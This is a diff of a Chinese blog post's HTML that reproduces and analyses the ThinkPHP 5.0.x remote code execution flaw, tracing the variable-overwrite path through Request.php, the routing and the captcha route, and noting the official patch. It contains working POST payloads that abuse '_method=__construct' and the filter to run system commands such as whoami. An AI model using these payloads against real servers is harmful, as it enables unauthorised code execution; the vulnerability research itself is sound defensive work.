@@ -7,14 +7,14 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
   <link rel="dns-prefetch" href="https://glotozz.github.io">
-  <title>ThinkPHP5.xRCE复现 | 往者不可谏，来者犹可追 | glotozz&#39;blog</title>
+  <title>ThinkPHP5.0.0~5.0.23 RCE复现 | 往者不可谏，来者犹可追 | glotozz&#39;blog</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
   <meta name="referrer" content="no-referrer">
   <!--more-->
   <meta name="description" content="我是真的菜。ThinkPHP5.1.x反序列化漏洞复现时需要结合RCE漏洞，这里就来先填补这个坑">
 <meta name="keywords" content="漏洞复现,tp5">
 <meta property="og:type" content="article">
-<meta property="og:title" content="ThinkPHP5.xRCE复现">
+<meta property="og:title" content="ThinkPHP5.0.0~5.0.23 RCE复现">
 <meta property="og:url" content="https://glotozz.github.io/2019/10/06/ThinkPHP5-xRCE复现/index.html">
 <meta property="og:site_name" content="往者不可谏，来者犹可追 | glotozz&#39;blog">
 <meta property="og:description" content="我是真的菜。ThinkPHP5.1.x反序列化漏洞复现时需要结合RCE漏洞，这里就来先填补这个坑">
@@ -40,9 +40,9 @@
 <meta property="og:image" content="https://i.loli.net/2019/10/07/9FOTt683pC2oLwK.png">
 <meta property="og:image" content="https://i.loli.net/2019/10/07/2qacEFy691JRYsj.png">
 <meta property="og:image" content="https://i.loli.net/2019/10/07/tqYh2fkjzKOcaU1.png">
-<meta property="og:updated_time" content="2019-10-27T03:21:58.930Z">
+<meta property="og:updated_time" content="2019-11-17T01:40:14.045Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="ThinkPHP5.xRCE复现">
+<meta name="twitter:title" content="ThinkPHP5.0.0~5.0.23 RCE复现">
 <meta name="twitter:description" content="我是真的菜。ThinkPHP5.1.x反序列化漏洞复现时需要结合RCE漏洞，这里就来先填补这个坑">
 <meta name="twitter:image" content="https://i.loli.net/2019/10/06/eXaZyuFWMLRQ2o1.png">
   
@@ -183,7 +183,7 @@
         
   
     <h1 class="article-title" itemprop="name">
-      ThinkPHP5.xRCE复现
+      ThinkPHP5.0.0~5.0.23 RCE复现
     </h1>
   
 
@@ -215,66 +215,66 @@
 
 <p><img src="https://i.loli.net/2019/10/06/eXaZyuFWMLRQ2o1.png" alt="Snipaste_2019-10-06_11-52-42.png"></p>
 <h4 id="二、漏洞实现"><a href="#二、漏洞实现" class="headerlink" title="二、漏洞实现"></a>二、漏洞实现</h4><blockquote>
-<p>如果不是完整版，需要开启debug模式。完整版则不用开启debug。</p>
+<p>具体版本不同payload会有差异</p>
 <p>上面的下载不是完整版，完整版可以去官网下载，我这里以完整版为例</p>
 </blockquote>
 <p>payload</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/tpdemo/public/index.php?s=captcha</span><br><span class="line">POST:</span><br><span class="line">_method=__construct&amp;filter[]=system&amp;method=get&amp;get[]=whoami</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://i.loli.net/2019/10/08/lkiDt4AMFHLjTYQ.png" alt="Snipaste_2019-10-08_17-27-08.png"></p>
-<p>下面的payload需要开启debug（还未分析）</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">POST:</span><br><span class="line">_method=__construct&amp;filter[]=call_user_func&amp;server[]=phpinfo&amp;get[]=phpinfo</span><br></pre></td></tr></table></figure>
+<p>下面的payload需要开启debug</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">POST:</span><br><span class="line">_method=__construct&amp;filter[]=call_user_func&amp;server[]=phpinfo&amp;get[]=phpinfo&amp;method=get</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://i.loli.net/2019/10/08/C8P9fp6keRHnZIY.png" alt="Snipaste_2019-10-08_17-28-14.png"></p>
 <h4 id="三、漏洞分析"><a href="#三、漏洞分析" class="headerlink" title="三、漏洞分析"></a>三、漏洞分析</h4><blockquote>
 <p>emmmm我是真的菜，看了链接中的文章看了好久都不懂。。。自己的分析能力还远远不够，只能跟着文章的思路</p>
 </blockquote>
-<p>先分析关键点</p>
-<p><strong>thinkphp/library/think/Request.php</strong></p>
+<p>先分析关键触发点</p>
+<p><code>thinkphp/library/think/Request.php</code></p>
 <p><img src="https://i.loli.net/2019/10/06/prDXZ1CNWEtLSYP.png" alt="Snipaste_2019-10-06_16-32-09.png"></p>
-<p>其中Config::get(‘var_method’)的值为_method，所以我们需要POST一个_method作为函数名，$_POST的作为参数。</p>
-<p>第一步便可以通过上面去调用Request类的__construct()方法</p>
+<p>其中<code>Config::get(&#39;var_method&#39;)</code>的值为<code>_method</code>，所以我们需要POST一个<code>_method</code>作为函数名（只能是<code>Request类</code>的某个属性），<code>$_POST数组</code>作为参数。</p>
+<p>第一步是通过上面去调用<code>Request类</code>的<code>__construct()</code>方法</p>
 <p><img src="https://i.loli.net/2019/10/07/orKtacRh8mxD5NP.png" alt="Snipaste_2019-10-07_08-21-04.png"></p>
-<p>存在明显的变量覆盖。$options是我们可控的，我们覆盖<strong>filter、method、get</strong>三个属性（为下面做铺垫）</p>
-<p>第二步是Request类中的param()方法</p>
+<p>存在明显的变量覆盖。<code>$options</code>是我们可控的，我们可以覆盖<code>filter、method、get</code>三个属性</p>
+<p>第二步是<code>Request类</code>中的<code>param()</code>方法</p>
 <p><img src="https://i.loli.net/2019/10/07/RwS4GjfyKld5bmX.png" alt="Snipaste_2019-10-07_08-26-17.png"></p>
-<p>如果$this-&gt;mergeParam为空，调用$this-&gt;get(false)</p>
+<p>如果<code>$this-&gt;mergeParam</code>为空，调用<code>$this-&gt;get(false)</code></p>
 <p><img src="https://i.loli.net/2019/10/07/Y4mRIDtixGjfLNg.png" alt="Snipaste_2019-10-07_08-28-10.png"></p>
-<p>跟踪input()</p>
+<p>跟踪<code>input()</code></p>
 <p><img src="https://i.loli.net/2019/10/07/RolD7yxpvBeqdZ6.png" alt="Snipaste_2019-10-07_08-32-33.png"></p>
-<p>跟踪getFilter()</p>
+<p>跟踪<code>getFilter()</code></p>
 <p><img src="https://i.loli.net/2019/10/07/1ADIGblfHdBaxUT.png" alt="Snipaste_2019-10-07_08-34-03.png"></p>
-<p>array_walk_recursive()对数组中的每个成员递归地应用filterValue()函数</p>
+<p>上面的方法没有啥过滤操作，<code>array_walk_recursive()</code>对数组中的每个成员递归地应用<code>filterValue()</code>函数</p>
 <p><img src="https://i.loli.net/2019/10/07/lgQtLxcyBzJvXi4.png" alt="Snipaste_2019-10-07_08-37-10.png"></p>
-<p>由于$filter我们可控，$value为$data，跟踪一下为$this-&gt;get，即可代码执行=。=</p>
-<p>再从头开始分析漏洞触发</p>
-<p>App.php的run()</p>
+<p>由于<code>$filter</code>我们可控，<code>$value</code>为<code>$data</code>，跟踪一下为<code>$this-&gt;get</code>，即可代码执行=。=</p>
+<p>从头开始分析漏洞触发</p>
+<p><code>App.php</code>的<code>run()</code></p>
 <p><img src="https://i.loli.net/2019/10/07/h7dl2VU98OgMt3q.png" alt="Snipaste_2019-10-07_09-03-53.png"></p>
-<p>先实例化一个Request类，然后调用routeCheck()</p>
+<p>先实例化一个<code>Request类</code>，然后调用<code>routeCheck()</code></p>
 <p><img src="https://i.loli.net/2019/10/07/Y3FvlnurtIh7zoT.png" alt="Snipaste_2019-10-07_09-05-55.png"></p>
-<p>调用Route类的check()</p>
+<p>调用<code>Route类的check()</code></p>
 <p><img src="https://i.loli.net/2019/10/07/VWzyhCKJbSrvEDc.png" alt="Snipaste_2019-10-07_09-10-28.png"></p>
-<p>857行即是我们前面分析的关键点一，变量覆盖。将返回值$this-&gt;method赋给$method变量，当然$this-&gt;method我们也可以覆盖。</p>
-<p>$rules的值为self::$rules[$method]</p>
-<p>然后考虑完整版和核心版的区别，完整版的vender/topthink/下存在一些模块，这里我们用captcha，其中helper.php</p>
+<p><code>857行</code>即是我们最开始分析的关键触发点，变量覆盖。将返回值<code>$this-&gt;method</code>赋给<code>$method</code>变量，当然<code>$this-&gt;method</code>我们也可以覆盖。</p>
+<p><code>$rules</code>的值为<code>self::$rules[$method]</code></p>
+<p>然后考虑完整版和核心版的区别，完整版的<code>vender/topthink/</code>下存在一些模块，这里我们用<code>captcha</code>，其中<code>helper.php</code></p>
 <p><img src="https://i.loli.net/2019/10/07/NEPt6fFqw8IcY17.png" alt="Snipaste_2019-10-07_09-22-02.png"></p>
-<p>helper.php</p>
+<p><code>helper.php</code></p>
 <p><img src="https://i.loli.net/2019/10/07/T45EkLlFCofzb2n.png" alt="Snipaste_2019-10-07_09-23-24.png"></p>
-<p>第12行路由注册的操作。而这步操作的影响就是改变了上文提到的self::$rules的值。有了这个路由，才能进行RCE，否则不成功。这也就是为什么只影响完整版，而不影响核心版的原因。</p>
-<p>查看self::rules</p>
+<p>第12行路由注册的操作。而这步操作的影响就是改变了上文提到的<code>self::$rules</code>的值。有了这个路由，才能进行<code>RCE</code>，否则不成功。这也就是为什么只影响完整版，而不影响核心版的原因。</p>
+<p>查看<code>self::rules</code></p>
 <p><img src="https://i.loli.net/2019/10/07/fIc3OwGFkolQLCM.png" alt="Snipaste_2019-10-07_09-32-05.png"></p>
-<p>当method为get即可使$rules为captcha路由数组，item为我们get传值传入的captcha才能进入parseRule()</p>
+<p>当<code>$method</code>为<code>get</code>即可使<code>$rules</code>为<code>captcha路由数组</code>，<code>item</code>为我们<code>get</code>传值传入的<code>captcha</code>才能进入<code>parseRule()</code></p>
 <p><img src="https://i.loli.net/2019/10/07/TksDgYONzilrmw8.png" alt="Snipaste_2019-10-07_09-45-22.png"></p>
-<p>返回的$dispatch结果</p>
+<p>返回的<code>$dispatch</code>结果</p>
 <p><img src="https://i.loli.net/2019/10/07/EiKn8ZGNgWP2kI4.png" alt="Snipaste_2019-10-07_09-49-46.png"></p>
-<p>之后会调用self::exec()</p>
+<p>之后会调用<code>self::exec()</code></p>
 <p><img src="https://i.loli.net/2019/10/07/9FOTt683pC2oLwK.png" alt="Snipaste_2019-10-07_09-51-01.png"></p>
-<p>追踪exec()</p>
+<p>追踪<code>exec()</code></p>
 <p><img src="https://i.loli.net/2019/10/07/2qacEFy691JRYsj.png" alt="Snipaste_2019-10-07_09-52-26.png"></p>
-<p>这里调用了param()，即可对应上面关键点的第二步，从而代码执行</p>
+<p>这里调用了<code>param()</code>，即可对应上面关键点的第二步，从而代码执行</p>
 <h3 id="四、漏洞修复"><a href="#四、漏洞修复" class="headerlink" title="四、漏洞修复"></a>四、漏洞修复</h3><p>官方补丁</p>
 <p><img src="https://i.loli.net/2019/10/07/tqYh2fkjzKOcaU1.png" alt="Snipaste_2019-10-07_10-01-48.png"></p>
-<p>对传入的_method进行白名单限制，无法调用任意类方法</p>
+<p>对传入的<code>_method</code>进行白名单限制，无法调用任意类方法</p>
 <blockquote>
 <p>挖出这洞的人ttttttql👍</p>
 </blockquote>
@@ -320,7 +320,7 @@
           </li>
           <li class="post-copyright-link">
           <strong>文章链接:  </strong>
-          <a href="/2019/10/06/ThinkPHP5-xRCE复现/" target="_blank" title="ThinkPHP5.xRCE复现">https://glotozz.github.io/2019/10/06/ThinkPHP5-xRCE复现/</a>
+          <a href="/2019/10/06/ThinkPHP5-xRCE复现/" target="_blank" title="ThinkPHP5.0.0~5.0.23 RCE复现">https://glotozz.github.io/2019/10/06/ThinkPHP5-xRCE复现/</a>
           </li>
           <li class="post-copyright-license">
             <strong>版权声明:   </strong>
